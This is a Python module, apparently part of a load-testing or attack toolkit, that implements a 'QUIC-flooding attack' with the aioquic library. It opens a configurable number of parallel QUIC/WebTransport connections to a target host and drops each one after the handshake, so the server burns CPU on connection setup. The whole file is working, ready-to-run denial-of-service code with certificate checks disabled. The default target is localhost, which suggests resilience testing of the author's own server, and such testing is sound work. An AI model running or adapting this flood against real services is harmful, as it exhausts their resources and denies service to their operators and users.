"""
QUIC-flooding attack: open N parallel WebTransport connections simultaneously.

Correct implementation (unlike the original Node.js single-connection version):
Each connection completes the QUIC handshake, then drops immediately.
This burns CPU on the server's connection-setup path, not message handling.
"""

import asyncio
import ssl
import time
from urllib.parse import urlparse

from aioquic.asyncio import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3Connection, H3_ALPN
from aioquic.h3.events import HeadersReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent


class FloodProtocol(QuicConnectionProtocol):
    """Minimal protocol: completes handshake, then disconnects."""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._http: H3Connection | None = None
        self._connected = asyncio.Event()

    def quic_event_received(self, event: QuicEvent):
        if self._http is None:
            self._http = H3Connection(self._quic, enable_webtransport=True)
        # Consume H3 events to complete handshake negotiation
        for _ in self._http.handle_event(event):
            pass
        # Signal that we're connected once QUIC handshake completes
        if not self._connected.is_set():
            self._connected.set()

    async def connect_and_drop(self):
        try:
            await asyncio.wait_for(self._connected.wait(), timeout=5.0)
        except asyncio.TimeoutError:
            pass
        finally:
            try:
                self._quic.close()
                self.transmit()
            except Exception:
                pass


async def _single_flood_connection(host: str, port: int, config: QuicConfiguration, idx: int) -> bool:
    try:
        async with connect(host, port, configuration=config, create_protocol=FloodProtocol) as proto:
            await proto.connect_and_drop()
        return True
    except Exception as e:
        return False


def _parse_target(target_url: str, default_port: int = 4434) -> tuple[str, int]:
    u = urlparse(target_url if "://" in target_url else f"//{target_url}")
    return (u.hostname or "127.0.0.1"), (u.port or default_port)


async def run(target_url: str, params: dict, progress_callback) -> dict:
    """
    QUIC-flooding: open `connections` parallel QUIC connections to the target,
    each completing the handshake then dropping. Reports progress as they finish.
    Result: {"handshakesCompleted": N, "failed": N, "duration": seconds}
    """
    host, port = _parse_target(target_url)
    connections = int(params.get("connections", 100))

    config = QuicConfiguration(
        alpn_protocols=H3_ALPN,
        is_client=True,
        max_datagram_frame_size=65536,
        verify_mode=ssl.CERT_NONE,
    )

    progress_callback(0, connections, f"Opening {connections} parallel QUIC connections → {host}:{port}")
    t0 = time.monotonic()
    completed = 0
    failed = 0
    step = max(1, connections // 20)

    async def one(i: int):
        nonlocal completed, failed
        ok = await _single_flood_connection(host, port, config, i)
        if ok:
            completed += 1
        else:
            failed += 1
        done = completed + failed
        if done % step == 0 or done == connections:
            progress_callback(done, connections, f"Handshakes completed: {completed}/{connections}")

    await asyncio.gather(*(one(i) for i in range(connections)))

    duration = round(time.monotonic() - t0, 2)
    progress_callback(connections, connections, f"Done: {completed} handshakes, {failed} failed in {duration}s")
    return {"handshakesCompleted": completed, "failed": failed, "duration": duration}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="https://127.0.0.1:4434")
    p.add_argument("--count", type=int, default=100)
    args = p.parse_args()
    asyncio.run(run(args.target, {"connections": args.count},
                    lambda c, t, m: print(f"[flood {c}/{t}] {m}", flush=True)))
